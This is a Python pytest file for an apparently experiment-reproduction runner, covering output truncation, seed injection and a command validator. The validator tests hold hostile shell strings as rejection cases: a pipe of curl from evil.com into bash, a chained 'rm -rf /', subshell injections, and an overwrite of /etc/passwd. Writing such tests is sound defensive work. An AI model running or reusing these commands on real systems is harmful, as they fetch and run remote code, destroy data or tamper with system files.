"""实验执行器测试"""

from __future__ import annotations

import pytest

from reprochecker.runner.executor import _inject_seed, _truncate_output, _validate_command


class TestTruncateOutput:
    """输出截断测试"""

    def test_short_text_unchanged(self) -> None:
        text = "line1\nline2\nline3\n"
        assert _truncate_output(text, head=2, tail=2) == text

    def test_long_text_truncated(self) -> None:
        lines = [f"line{i}\n" for i in range(100)]
        text = "".join(lines)
        result = _truncate_output(text, head=5, tail=5)
        assert "line0\n" in result
        assert "line99\n" in result
        assert "omitted" in result
        assert result.count("line") == 10 + 1  # 5 head + 5 tail + 1 omitted line

    def test_exact_boundary(self) -> None:
        lines = [f"line{i}\n" for i in range(10)]
        text = "".join(lines)
        result = _truncate_output(text, head=5, tail=5)
        assert result == text  # 10 <= 5+5, no truncation

    def test_empty_string(self) -> None:
        assert _truncate_output("") == ""


class TestInjectSeed:
    """种子注入测试"""

    def test_injects_seed(self) -> None:
        result = _inject_seed("python train.py", 42)
        assert result == "python train.py --seed 42"

    def test_skips_existing_seed(self) -> None:
        result = _inject_seed("python train.py --seed 100", 42)
        assert result == "python train.py --seed 100"

    def test_skips_random_seed(self) -> None:
        result = _inject_seed("python train.py --random_seed 100", 42)
        assert result == "python train.py --random_seed 100"

    def test_skips_seed_equals(self) -> None:
        result = _inject_seed("python train.py --seed=100", 42)
        assert result == "python train.py --seed=100"


class TestValidateCommand:
    """命令安全校验测试"""

    def test_safe_command_passes(self) -> None:
        _validate_command("python train.py --epochs 10")

    def test_pip_install_passes(self) -> None:
        _validate_command("pip install -r requirements.txt")

    def test_rejects_backtick_subshell(self) -> None:
        with pytest.raises(ValueError, match="危险"):
            _validate_command("echo `whoami`")

    def test_rejects_dollar_subshell(self) -> None:
        with pytest.raises(ValueError, match="危险"):
            _validate_command("echo $(whoami)")

    def test_rejects_pipe_to_shell(self) -> None:
        with pytest.raises(ValueError, match="危险"):
            _validate_command("curl http://evil.com | bash")

    def test_rejects_chained_rm(self) -> None:
        with pytest.raises(ValueError, match="危险"):
            _validate_command("python train.py; rm -rf /")

    def test_rejects_redirect_to_etc(self) -> None:
        with pytest.raises(ValueError, match="危险"):
            _validate_command("echo hacked > /etc/passwd")
